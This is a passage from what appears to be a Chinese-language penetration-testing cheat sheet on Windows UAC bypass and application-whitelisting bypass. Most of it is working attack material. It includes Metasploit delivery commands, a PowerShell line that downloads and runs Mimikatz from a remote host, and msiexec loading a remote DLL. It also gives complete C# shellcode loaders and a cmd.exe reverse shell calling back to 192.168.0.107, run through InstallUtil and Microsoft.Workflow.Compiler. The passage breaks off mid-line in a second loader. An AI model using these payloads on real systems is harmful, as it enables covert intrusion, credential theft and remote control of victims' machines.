/></p>\n<pre><code>添加一条过滤器，显示not found文件\n</code></pre>\n<p><img data-src=\"124.png\" alt=\"\" /></p>\n<pre><code>找到相应的注册表位置\n</code></pre>\n<p><img data-src=\"125.png\" alt=\"\" /><br />\n<img data-src=\"126.png\" alt=\"\" /></p>\n<pre><code>值修改为\n</code></pre>\n<p><img data-src=\"127.png\" alt=\"\" /></p>\n<pre><code>MSF监听，再次打开eventvwr\n</code></pre>\n<p><img data-src=\"128.png\" alt=\"\" /></p>\n<h2 id=\"-270\"><a class=\"anchor\" href=\"#-270\">#</a> </h2>\n<h2 id=\"web-delivery\"><a class=\"anchor\" href=\"#web-delivery\">#</a> Web Delivery</h2>\n<pre><code>&gt;use exploit/multi/script/web_delivery\n&gt;set target 3\n&gt;set payload windows/x64/meterpreter/reverse_tcp\n&gt;exploit\n&gt;use auxiliary/server/regsvr32_command_delivery_server\n&gt;set cmd ipconfig\n&gt;use exploit/windows/misc/regsvr32_applocker_bypass_server\n</code></pre>\n<h2 id=\"-271\"><a class=\"anchor\" href=\"#-271\">#</a> </h2>\n<h2 id=\"invoke-psuacme\"><a class=\"anchor\" href=\"#invoke-psuacme\">#</a> Invoke-PsUACme</h2>\n<pre><code>method=&quot;sysprep&quot;,&quot;oobe&quot;,&quot;ActionQueue&quot;,&quot;migwiz&quot;,&quot;cliconfg&quot;,&quot;winsat&quot;,&quot;mmc&quot;\n&gt;Invoke-PsUACme -method oobe -Payload &quot;c:\\user\\a\\desktop\\x.exe&quot;\n需指定绝对路径\n&gt;Invoke-PsUACme -method oobe -Payload &quot;powershell -w hidden -e xxxxxx&quot;\n&gt;Invoke-PsUACme -Payload &quot;powershell -noexit IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz&quot;\nMSFVENOM生成psh-reflection格式脚本\n&gt;Invoke-PsUACme –Payload &quot;powershell c:\\1.ps1&quot;\n</code></pre>\n<h3 id=\"whitelist白名单\"><a class=\"anchor\" href=\"#whitelist白名单\">#</a> Whitelist (白名单)</h3>\n<h2 id=\"-272\"><a class=\"anchor\" href=\"#-272\">#</a> </h2>\n<h2 id=\"greatsct-2\"><a class=\"anchor\" href=\"#greatsct-2\">#</a> GreatSCT</h2>\n<pre><code>&gt;git clone https://github.com/GreatSCT/GreatSCT.git\n&gt;cd GreatSCT/setup&amp;./setup.sh\n&gt;use Bypass\n&gt;list\n&gt;use regasm/meterpreter/rev_tcp.py\n&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc\n</code></pre>\n<h2 id=\"-273\"><a class=\"anchor\" href=\"#-273\">#</a> </h2>\n<h2 id=\"jsrat\"><a class=\"anchor\" href=\"#jsrat\">#</a> JSRat</h2>\n<pre><code>&gt;JSRat.py -i 192.168.1.107 -p 4444\n</code></pre>\n<h2 id=\"-274\"><a class=\"anchor\" href=\"#-274\">#</a> </h2>\n<h2 id=\"odbcconfexe\"><a class=\"anchor\" href=\"#odbcconfexe\">#</a> Odbcconf.exe</h2>\n<pre><code>&gt;odbcconf.exe /a &#123;regsvr C:\\shell.dll&#125; 可以是任意后缀\n</code></pre>\n<h2 id=\"-275\"><a class=\"anchor\" href=\"#-275\">#</a> </h2>\n<h2 id=\"msiexecexe\"><a class=\"anchor\" href=\"#msiexecexe\">#</a> Msiexec.exe</h2>\n<pre><code>&gt;msiexec /y c:\\user\\admin\\desktop\\1.dll\n&gt;msiexec /q /i http://192.168.0.107/dll.dll\n</code></pre>\n<h2 id=\"-276\"><a class=\"anchor\" href=\"#-276\">#</a> </h2>\n<h2 id=\"installutilexe\"><a class=\"anchor\" href=\"#installutilexe\">#</a> InstallUtil.exe</h2>\n<pre><code>&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\\Users\\y\\Desktop\\1.cs\nusing System;\nusing System.Net;\nusing System.Linq;\nusing System.Net.Sockets;\nusing System.Runtime.InteropServices;\nusing System.Threading;\nusing System.Configuration.Install;\nusing System.Windows.Forms;\npublic class GQLBigHgUniLuVx &#123;\n\tpublic static void Main()\n\t&#123;\n\t\twhile(true)\n\t\t&#123;&#123; MessageBox.Show(\"doge\"); Console.ReadLine();&#125;&#125;\n\t&#125;\n&#125;\n[System.ComponentModel.RunInstaller(true)]\npublic class esxWUYUTWShqW : System.Configuration.Install.Installer\n&#123;\n\tpublic override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)\n\t&#123;\n\t\tjkmhGrfzsKQeCG.LCIUtRN();\n\t&#125;\n&#125;\npublic class jkmhGrfzsKQeCG\n&#123; [DllImport(&quot;kernel&quot;)] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);\n[DllImport(&quot;kernel32&quot;)] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);\n[DllImport(&quot;kernel32&quot;)] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);\nstatic byte[] ErlgHH(string ZwznjBJY,int KsMEeo) &#123;\nIPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);\nSocket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\ntry &#123; XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); &#125;\ncatch &#123; return null;&#125;\nbyte[] UmquAHRnhhpuE = new byte[4];\nXXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);\nint kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);\nbyte[] qaYyFq = new byte[kFVRSNnpj +5];\nint SRCDELibA =0;\nwhile(SRCDELibA &lt; kFVRSNnpj)\n&#123; SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)&lt;4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);&#125;\nbyte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);\nArray.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;\nreturn qaYyFq;&#125;\nstatic void cmMtjerv(byte[] HEHUjJhkrNS) &#123;\nif(HEHUjJhkrNS !=null) &#123;\nUInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);\nMarshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);\nIntPtr UhxtIFnlOQatrk = IntPtr.Zero;\nUInt32 wdjYKFDCCf =0;\nIntPtr XVYcQxpp = IntPtr.Zero;\nUhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);\nWaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); &#125;&#125;\npublic static void LCIUtRN() &#123;\nbyte[] IBtCWU =null; IBtCWU = ErlgHH(&quot;192.168.0.107&quot;,12138);\ncmMtjerv(IBtCWU);\n&#125; &#125;\n生成exe后执行\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\y.exe\nMSF监听12138端口\n</code></pre>\n<h2 id=\"-277\"><a class=\"anchor\" href=\"#-277\">#</a> </h2>\n<h2 id=\"compilerexe\"><a class=\"anchor\" href=\"#compilerexe\">#</a> Compiler.exe</h2>\n<pre><code>&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp\n</code></pre>\n<p><img data-src=\"129.png\" alt=\"\" /></p>\n<h2 id=\"-278\"><a class=\"anchor\" href=\"#-278\">#</a> </h2>\n<h3 id=\"1xml\"><a class=\"anchor\" href=\"#1xml\">#</a> 1.xml</h3>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&lt;CompilerInput xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler&quot;&gt;\n&lt;files xmlns:d2p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;\n&lt;d2p1:string&gt;1.tcp&lt;/d2p1:string&gt;\n&lt;/files&gt;\n&lt;parameters xmlns:d2p1=&quot;http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler&quot;&gt;\n&lt;assemblyNames xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;compilerOptions i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;coreAssemblyFileName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/coreAssemblyFileName&gt;\n&lt;embeddedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;evidence xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Security.Policy&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;generateExecutable xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/generateExecutable&gt;\n&lt;generateInMemory xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;true&lt;/generateInMemory&gt;\n&lt;includeDebugInformation xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/includeDebugInformation&gt;\n&lt;linkedResources xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;mainClass i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;outputName xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;&lt;/outputName&gt;\n&lt;tempFiles i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;treatWarningsAsErrors xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;false&lt;/treatWarningsAsErrors&gt;\n&lt;warningLevel xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;&gt;-1&lt;/warningLevel&gt;\n&lt;win32Resource i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler&quot;/&gt;\n&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;\n&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;\n&lt;d2p1:compilerOptions i:nil=&quot;true&quot; /&gt;\n&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;\n&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;\n&lt;d2p1:libraryPaths xmlns:d3p1=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; i:nil=&quot;true&quot; /&gt;\n&lt;d2p1:localAssembly xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.Reflection&quot; i:nil=&quot;true&quot; /&gt;\n&lt;d2p1:mtInfo i:nil=&quot;true&quot;/&gt;\n&lt;d2p1:userCodeCCUs xmlns:d3p1=&quot;http://schemas.datacontract.org/2004/07/System.CodeDom&quot; i:nil=&quot;true&quot; /&gt;\n&lt;/parameters&gt;\n&lt;/CompilerInput&gt;\n</code></pre>\n<h2 id=\"-279\"><a class=\"anchor\" href=\"#-279\">#</a> </h2>\n<h3 id=\"1tcp\"><a class=\"anchor\" href=\"#1tcp\">#</a> 1.tcp</h3>\n<figure class=\"highlight csharp\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Text</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>IO</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Diagnostics</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>ComponentModel</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Net</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Net<span class=\"token punctuation\">.</span>Sockets</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Workflow<span class=\"token punctuation\">.</span>Activities</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">SequentialWorkflowActivity</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token class-name\">StreamWriter</span> streamWriter<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token function\">Program</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TcpClient</span> client <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">TcpClient</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"192.168.0.107\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12138</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Stream</span> stream <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">GetStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">using</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">StreamReader</span> rdr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StreamReader</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>streamWriter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StreamWriter</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token class-name\">StringBuilder</span> strInput <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token class-name\">Process</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">Process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>FileName <span class=\"token operator\">=</span> <span class=\"token string\">\"cmd.exe\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>CreateNoWindow <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>UseShellExecute <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardOutput <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardInput <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardError <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>OutputDataReceived <span class=\"token operator\">+=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">DataReceivedEventHandler</span><span class=\"token punctuation\">(</span>CmdOutputDataHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">BeginOutputReadLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>strInput<span class=\"token punctuation\">.</span><span class=\"token function\">Append</span><span class=\"token punctuation\">(</span>rdr<span class=\"token punctuation\">.</span><span class=\"token function\">ReadLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>StandardInput<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>strInput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>strInput<span class=\"token punctuation\">.</span><span class=\"token function\">Remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> strInput<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">CmdOutputDataHandler</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">object</span></span> sendingProcess<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DataReceivedEventArgs</span> outLine<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token class-name\">StringBuilder</span> strOutput <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>String<span class=\"token punctuation\">.</span><span class=\"token function\">IsNullOrEmpty</span><span class=\"token punctuation\">(</span>outLine<span class=\"token punctuation\">.</span>Data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">try</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>strOutput<span class=\"token punctuation\">.</span><span class=\"token function\">Append</span><span class=\"token punctuation\">(</span>outLine<span class=\"token punctuation\">.</span>Data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>streamWriter<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>strOutput<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>streamWriter<span class=\"token punctuation\">.</span><span class=\"token function\">Flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe 1.xml 1.cs\n</code></pre>\n<p><img data-src=\"130.png\" alt=\"\" /></p>\n<figure class=\"highlight csharp\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Workflow<span class=\"token punctuation\">.</span>Activities</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Net</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Net<span class=\"token punctuation\">.</span>Sockets</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Runtime<span class=\"token punctuation\">.</span>InteropServices</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Threading</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">yrDaTlg</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">SequentialWorkflowActivity</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">IntPtr</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> rCfMkmxRSAakg<span class=\"token punctuation\">,</span><span class=\"token class-name\">UInt32</span> qjRsrljIMB<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> peXiTuE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> AkpADfOOAVBZ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">bool</span></span> <span class=\"token function\">VirtualProtect</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IntPtr</span> DStOGXQMMkP<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">uint</span></span> CzzIpcuQppQSTBJ<span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token keyword\">uint</span></span> JCFImGhkRqtwANx<span class=\"token punctuation\">,</span> <span class=\"token keyword\">out</span> <span class=\"token class-name\"><span class=\"token keyword\">uint</span></span> exgVpSg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">IntPtr</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UInt32</span> eisuQbXKYbAvA<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> WQATOZaFz<span class=\"token punctuation\">,</span> <span class=\"token class-name\">IntPtr</span> AEGJQOn<span class=\"token punctuation\">,</span><span class=\"token class-name\">IntPtr</span> SYcfyeeSgPl<span class=\"token punctuation\">,</span> <span class=\"token class-name\">UInt32</span> ZSheqBwKtDf<span class=\"token punctuation\">,</span> <span class=\"token keyword\">ref</span> <span class=\"token class-name\">UInt32</span> SZtdSB<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token attribute\"><span class=\"token class-name\">DllImport</span><span class=\"token attribute-arguments\"><span class=\"token punctuation\">(</span><span class=\"token string\">\"kernel32\"</span><span class=\"token punctuation\">)</span></span></span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">extern</span> <span class=\"token return-type class-name\">UInt32</span> <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span><span 